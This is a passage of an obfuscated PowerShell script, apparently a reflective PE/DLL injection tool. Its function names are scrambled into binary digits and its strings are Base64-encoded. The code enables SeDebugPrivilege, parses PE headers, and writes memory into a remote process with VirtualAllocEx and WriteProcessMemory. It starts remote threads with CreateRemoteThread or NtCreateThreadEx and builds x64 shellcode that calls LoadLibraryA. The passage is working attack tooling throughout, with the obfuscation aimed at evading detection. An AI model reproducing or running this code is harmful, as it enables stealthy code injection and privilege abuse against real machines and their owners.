        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
      }
      return [BitConverter]::ToInt64(${00010101010101011}, 0)
    }
    Function _01000001001001111
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        ${_10000101001010010},
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        ${_10100100000101100}
      )
      [Byte[]]${10001000101000001} = [BitConverter]::GetBytes(${_10000101001010010})
      [Byte[]]${01100101000100100} = [BitConverter]::GetBytes(${_10100100000101100})
      [Byte[]]${00010101010101011} = [BitConverter]::GetBytes([UInt64]0)
      if (${10001000101000001}.Count -eq ${01100101000100100}.Count)
      {
        ${01000010111100101} = 0
        for (${00111011010111001} = 0; ${00111011010111001} -lt ${10001000101000001}.Count; ${00111011010111001}++)
        {
          [UInt16]${00000101010110110} = ${10001000101000001}[${00111011010111001}] + ${01100101000100100}[${00111011010111001}] + ${01000010111100101}
          ${00010101010101011}[${00111011010111001}] = ${00000101010110110} -band 0x00FF
          if ((${00000101010110110} -band 0xFF00) -eq 0x100)
          {
            ${01000010111100101} = 1
          }
          else
          {
            ${01000010111100101} = 0
          }
        }
      }
      else
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
      }
      return [BitConverter]::ToInt64(${00010101010101011}, 0)
    }
    Function _10110101011010111
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        ${_10000101001010010},
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        ${_10100100000101100}
      )
      [Byte[]]${10001000101000001} = [BitConverter]::GetBytes(${_10000101001010010})
      [Byte[]]${01100101000100100} = [BitConverter]::GetBytes(${_10100100000101100})
      if (${10001000101000001}.Count -eq ${01100101000100100}.Count)
      {
        for (${00111011010111001} = ${10001000101000001}.Count-1; ${00111011010111001} -ge 0; ${00111011010111001}--)
        {
          if (${10001000101000001}[${00111011010111001}] -gt ${01100101000100100}[${00111011010111001}])
          {
            return $true
          }
          elseif (${10001000101000001}[${00111011010111001}] -lt ${01100101000100100}[${00111011010111001}])
          {
            return $false
          }
        }
      }
      else
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
      }
      return $false
    }
    Function Convert-UIntToInt
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
      )
      [Byte[]]${10111110100000100} = [BitConverter]::GetBytes($Value)
      return ([BitConverter]::ToInt64(${10111110100000100}, 0))
    }
    Function _10110000010101001
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )
        ${01011110001110010} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        ${00010101111000100} = "0x{0:X$(${01011110001110010})}" -f [Int64]$Value 
        return ${00010101111000100}
    }
    Function _00011010101001110
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        ${_01100101100000011},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        ${_01001010010000001},
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        ${_00101100101110110}
      )
      [IntPtr]${01101111011101101} = [IntPtr](_01000001001001111 (${_01001010010000001}) (${_00101100101110110}))
      ${00000000001100010} = ${_00001100001100000}.EndAddress
      if ((_10110101011010111 (${_00001100001100000}.PEHandle) (${_01001010010000001})) -eq $true)
      {
        Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAwADEAMQAwADAAMQAwADEAMQAwADAAMAAwADAAMAAxADEAfQA=')))
      }
      if ((_10110101011010111 (${01101111011101101}) (${00000000001100010})) -eq $true)
      {
        Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAwADEAMQAwADAAMQAwADEAMQAwADAAMAAwADAAMAAxADEAfQA=')))
      }
    }
    Function _01000001010000001
    {
      Param(
        [Parameter(Position=0, Mandatory = $true)]
        [Byte[]]
        ${_00101001000101111},
        [Parameter(Position=1, Mandatory = $true)]
        [IntPtr]
        ${_00000110000010110}
      )
      for (${10010100111101010} = 0; ${10010100111101010} -lt ${_00101001000101111}.Length; ${10010100111101010}++)
      {
        [System.Runtime.InteropServices.Marshal]::WriteByte(${_00000110000010110}, ${10010100111101010}, ${_00101001000101111}[${10010100111101010}])
      }
    }
    Function _00010110010100011
    {
      Param
      (
          [OutputType([Type])]
          [Parameter( Position = 0)]
          [Type[]]
          ${_01100110011100100} = (New-Object Type[](0)),
          [Parameter( Position = 1 )]
          [Type]
          ${_10001100010000001} = [Void]
      )
      ${10001000000100110} = [AppDomain]::CurrentDomain
      ${00110110100110100} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
      ${00101100101101101} = ${10001000000100110}.DefineDynamicAssembly(${00110110100110100}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
      ${10100010010101101} = ${00101100101101101}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
      ${10011001011101111} = ${00111011010110110}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${_01100110011100100})
      ${10011001011101111}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
      ${00110010000001011} = ${00111011010110110}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_10001100010000001}, ${_01100110011100100})
      ${00110010000001011}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
      echo ${00111011010110110}.CreateType()
    }
    Function _10000000110001100
    {
      Param
      (
          [OutputType([IntPtr])]
          [Parameter( Position = 0, Mandatory = $True )]
          [String]
          ${_10100001000010101},
          [Parameter( Position = 1, Mandatory = $True )]
          [String]
          ${_10111111000001011}
      )
      ${10101110101101000} = [AppDomain]::CurrentDomain.GetAssemblies() |
          ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
      ${00010011010010111} = ${10101110101101000}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
      ${01011101001100011} = ${00010011010010111}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
      ${00011110011111000} = ${00010011010010111}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [reflection.bindingflags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
      ${10011101010110110} = ${01011101001100011}.Invoke($null, @(${_10100001000010101}))
      ${00010101101011000} = New-Object IntPtr
      ${01110100100011110} = New-Object System.Runtime.InteropServices.HandleRef(${00010101101011000}, ${10011101010110110})
      echo ${00011110011111000}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${01110100100011110}, ${_10111111000001011}))
    }
    Function Enable-SeDebugPrivilege
    {
      Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
      )
      [IntPtr]${10011001111100100} = $Win32Functions.GetCurrentThread.Invoke()
      if (${10011001111100100} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
      }
      [IntPtr]${10111100001111110} = [IntPtr]::Zero
      [Bool]${10101110001001011} = $Win32Functions.OpenThreadToken.Invoke(${10011001111100100}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10111100001111110})
      if (${10101110001001011} -eq $false)
      {
        ${01010011010011011} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if (${01010011010011011} -eq $Win32Constants.ERROR_NO_TOKEN)
        {
          ${10101110001001011} = $Win32Functions.ImpersonateSelf.Invoke(3)
          if (${10101110001001011} -eq $false)
          {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
          }
          ${10101110001001011} = $Win32Functions.OpenThreadToken.Invoke(${10011001111100100}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10111100001111110})
          if (${10101110001001011} -eq $false)
          {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
          }
        }
        else
        {
          Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMQAwADEAMAAwADEAMQAwADEAMAAwADEAMQAwADEAMQB9AA==')))
        }
      }
      [IntPtr]${00110110111000111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
      ${10101110001001011} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${00110110111000111})
      if (${10101110001001011} -eq $false)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
      }
      [UInt32]${01011101101111011} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
      [IntPtr]${01110010000100101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01011101101111011})
      ${00011001111101100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01110010000100101}, [Type]$Win32Types.TOKEN_PRIVILEGES)
      ${00011001111101100}.PrivilegeCount = 1
      ${00011001111101100}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00110110111000111}, [Type]$Win32Types.LUID)
      ${00011001111101100}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00011001111101100}, ${01110010000100101}, $true)
      ${10101110001001011} = $Win32Functions.AdjustTokenPrivileges.Invoke(${10111100001111110}, $false, ${01110010000100101}, ${01011101101111011}, [IntPtr]::Zero, [IntPtr]::Zero)
      ${01010011010011011} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
      if ((${10101110001001011} -eq $false) -or (${01010011010011011} -ne 0))
      {
      }
      [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01110010000100101})
    }
    Function _00011001110011000
    {
      Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        ${_01000010000110000},
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        ${_01001010010000001},
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        ${_01100101011001011} = [IntPtr]::Zero,
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
      )
      [IntPtr]${00010110001010110} = [IntPtr]::Zero
      ${10111100110010001} = [Environment]::OSVersion.Version
      if ((${10111100110010001} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${10111100110010001} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
      {
        ${00011001111000100}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${00010110001010110}, 0x1FFFFF, [IntPtr]::Zero, ${_01000010000110000}, ${_01001010010000001}, ${_01100101011001011}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
        ${01110111111000101} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if (${00010110001010110} -eq [IntPtr]::Zero)
        {
          Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewAwADAAMAAxADEAMAAwADEAMQAxADEAMAAwADAAMQAwADAAfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewAwADEAMQAxADAAMQAxADEAMQAxADEAMAAwADAAMQAwADEAfQA=')))
        }
      }
      else
      {
        ${00010110001010110} = $Win32Functions.CreateRemoteThread.Invoke(${_01000010000110000}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${_01001010010000001}, ${_01100101011001011}, 0, [IntPtr]::Zero)
      }
      if (${00010110001010110} -eq [IntPtr]::Zero)
      {
        Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
      }
      return ${00010110001010110}
    }
    Function _10001010010111101
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        ${_10101011101010101},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
      )
      ${00111100010011001} = New-Object System.Object
      ${00111100100100001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_10101011101010101}, [Type]$Win32Types.IMAGE_DOS_HEADER)
      [IntPtr]${10101110100001000} = [IntPtr](_01000001001001111 ([Int64]${_10101011101010101}) ([Int64][UInt64]${00111100100100001}.e_lfanew))
      ${00111100010011001} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${10101110100001000}
      ${01011001110000110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10101110100001000}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
      if (${01011001110000110}.Signature -ne 0x00004550)
      {
          throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
      }
      if (${01011001110000110}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
      {
        ${00111100010011001} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${01011001110000110}
        ${00111100010011001} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
      }
      else
      {
        ${01101010110101111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10101110100001000}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
        ${00111100010011001} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${01101010110101111}
        ${00111100010011001} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
      }
      return ${00111100010011001}
    }
    Function _01000100100011000
    {
      Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        ${_00110111011010011},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
      )
      ${_00001100001100000} = New-Object System.Object
      [IntPtr]${10110011010111001} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_00110111011010011}.Length)
      [System.Runtime.InteropServices.Marshal]::Copy(${_00110111011010011}, 0, ${10110011010111001}, ${_00110111011010011}.Length) | Out-Null
      ${00111100010011001} = _10001010010111101 -_10101011101010101 ${10110011010111001} -Win32Types $Win32Types
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${00111100010011001}.PE64Bit)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${00111100010011001}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${00111100010011001}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${00111100010011001}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${00111100010011001}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
      [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10110011010111001})
      return ${_00001100001100000}
    }
    Function _00010110110001110
    {
      Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        ${_10101011101010101},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
      )
      if (${_10101011101010101} -eq $null -or ${_10101011101010101} -eq [IntPtr]::Zero)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
      }
      ${_00001100001100000} = New-Object System.Object
      ${00111100010011001} = _10001010010111101 -_10101011101010101 ${_10101011101010101} -Win32Types $Win32Types
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${_10101011101010101}
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${00111100010011001}.IMAGE_NT_HEADERS)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${00111100010011001}.NtHeadersPtr)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${00111100010011001}.PE64Bit)
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${00111100010011001}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
      if (${_00001100001100000}.PE64Bit -eq $true)
      {
        [IntPtr]${01100000000010011} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
        ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${01100000000010011}
      }
      else
      {
        [IntPtr]${01100000000010011} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
        ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${01100000000010011}
      }
      if ((${00111100010011001}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
      {
        ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
      }
      elseif ((${00111100010011001}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
      {
        ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
      }
      else
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
      }
      return ${_00001100001100000}
    }
    Function _10100011101100110
    {
      Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        ${_01000110101000100},
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        ${_10101111101000110}
      )
      ${11000010010100101} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
      ${00010000000011101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_10101111101000110})
      ${00010111111111111} = [UIntPtr][UInt64]([UInt64]${00010000000011101}.Length + 1)
      ${01100011010101111} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, ${00010111111111111}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
      if (${01100011010101111} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
      }
      [UIntPtr]${10001110110000010} = [UIntPtr]::Zero
      ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${01100011010101111}, ${_10101111101000110}, ${00010111111111111}, [Ref]${10001110110000010})
      if (${10111100011001010} -eq $false)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
      }
      if (${00010111111111111} -ne ${10001110110000010})
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
      }
      ${01101110000011100} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
      ${00111000010101110} = $Win32Functions.GetProcAddress.Invoke(${01101110000011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
      [IntPtr]${01011000001011010} = [IntPtr]::Zero
      if (${_00001100001100000}.PE64Bit -eq $true)
      {
        ${01001101010000011} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, ${00010111111111111}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if (${01001101010000011} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
        }
        ${01011001100001110} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
        ${01100001011000101} = @(0x48, 0xba)
        ${01010011101110011} = @(0xff, 0xd2, 0x48, 0xba)
        ${10010000100110110} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        ${01010101100101101} = ${01011001100001110}.Length + ${01100001011000101}.Length + ${01010011101110011}.Length + ${10010000100110110}.Length + (${11000010010100101} * 3)
        ${01001010101000110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010101100101101})
        ${00010101011110100} = ${01001010101000110}
        _01000001010000001 -_00101001000101111 ${01011001100001110} -_00000110000010110 ${01001010101000110}
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${01011001100001110}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01100011010101111}, ${01001010101000110}, $false)
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
        _01000001010000001 -_00101001000101111 ${01100001011000101} -_00000110000010110 ${01001010101000110}
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${01100001011000101}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00111000010101110}, ${01001010101000110}, $false)
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
        _01000001010000001 -_00101001000101111 ${01010011101110011} -_00000110000010110 ${01001010101000110}
